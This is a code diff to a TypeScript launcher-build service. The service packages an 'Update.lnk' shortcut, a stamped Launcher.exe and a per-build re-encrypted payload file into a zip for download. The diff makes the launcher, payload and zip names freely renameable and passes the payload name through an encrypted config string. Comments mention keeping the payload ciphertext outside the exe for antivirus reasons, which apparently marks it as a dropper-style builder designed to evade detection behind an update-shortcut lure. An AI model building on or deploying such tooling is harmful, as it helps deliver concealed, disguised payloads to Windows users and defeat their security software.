@@ -66,6 +66,8 @@ export interface LauncherNames {
   updateLinkName?: string; // the .lnk entry name (default "Update.lnk")
   innerFolder?: string; // the subfolder holding launcher+payload (default "launcher")
   zipName?: string; // the served zip download filename (default "Agent.zip")
+  launcherName?: string; // the launcher exe entry name (default "Launcher.exe")
+  payloadName?: string; // the encrypted payload entry name (default "agent.bin")
 }
 
 const LNK_TIMEOUT_MS = 120000; // pwsh New-AgentShortcut.ps1 (bridge .lnk build)
@@ -80,9 +82,9 @@ function sha256Hex(data: Buffer): string {
 }
 
 /** URL-query config wire format (values percent-encoded, mirrored in CfgGet). */
-export function buildConfigString(c: LauncherBuildInputs): string {
+export function buildConfigString(c: LauncherBuildInputs, payloadName?: string): string {
   const enc = (s: string) => encodeURIComponent(s);
-  return [
+  const parts = [
     `apiUrl=${enc(c.apiUrl)}`,
     `clientId=${enc(String(c.clientId))}`,
     `siteId=${enc(String(c.siteId))}`,
@@ -92,7 +94,12 @@ export function buildConfigString(c: LauncherBuildInputs): string {
     `enroll=${enc(c.enroll)}`,
     `outDir=${enc(c.outDir)}`,
     `debug=${c.debug ? "1" : "0"}`,
-  ].join("&");
+  ];
+  // The runtime payload sibling-file name (FIX 3 rename): the native launcher
+  // reads this from the decrypted config so the zip entry may be renamed
+  // freely (falls back to "agent.bin" when absent — legacy stamps stay valid).
+  if (payloadName) parts.push(`payName=${enc(payloadName)}`);
+  return parts.join("&");
 }
 
 interface PwshResult {
@@ -163,6 +170,8 @@ export async function runLauncherBuild(opts: {
     updateLinkName = withExt.length <= 64 ? withExt : "Update.lnk";
   }
   const innerFolder = clean(opts.names?.innerFolder, "launcher");
+  const launcherName = clean(opts.names?.launcherName, "Launcher.exe");
+  const payloadName = clean(opts.names?.payloadName, "agent.bin");
   // FIX 3: custom served zip download name (optional; fallback "Agent.zip").
   // Sanitized with the same bare-name rule, then persisted per job so
   // getZipDownload can set Content-Disposition at download time.
@@ -181,7 +190,7 @@ export async function runLauncherBuild(opts: {
   const payCipher = payloadCache.reKey(plain, kb, ivPay);
 
   // 3. config string + cipher (K_B/IV_CFG).
-  const configText = buildConfigString(inputs);
+  const configText = buildConfigString(inputs, payloadName);
 
   // 4. assemble the (EXTERNAL-payload) overlay + write the sibling agent.bin.
   //    Option A (AV): the payload ciphertext is NOT appended to Launcher.exe,
@@ -236,6 +245,8 @@ export async function runLauncherBuild(opts: {
     lnkPath,
     "-LauncherSubFolder",
     innerFolder,
+    "-LauncherTarget",
+    launcherName,
     "-LauncherTag",
     entry.tag,
   ]);
@@ -252,8 +263,8 @@ export async function runLauncherBuild(opts: {
   //    structure; the names are FIX 3 (defaults preserved when unset).
   const zip = createZip([
     { name: updateLinkName, data: lnk },
-    { name: `${innerFolder}/Launcher.exe`, data: stampedExe },
-    { name: `${innerFolder}/agent.bin`, data: agentBin },
+    { name: `${innerFolder}/${launcherName}`, data: stampedExe },
+    { name: `${innerFolder}/${payloadName}`, data: agentBin },
   ]);
   const zipPath = storage.zipOutputPath(jobId);
   fs.writeFileSync(zipPath, zip);
@@ -272,7 +283,7 @@ export async function runLauncherBuild(opts: {
     agentBin,
     prevLauncherHash: lastLauncherSha256,
     prevLnkHash: lastLnkSha256,
-    names: { updateLinkName, innerFolder },
+    names: { updateLinkName, innerFolder, launcherName, payloadName },
   });
   for (const row of validation.rows) console.log(`  [validate] ${row}`);
   if (!validation.ok) {
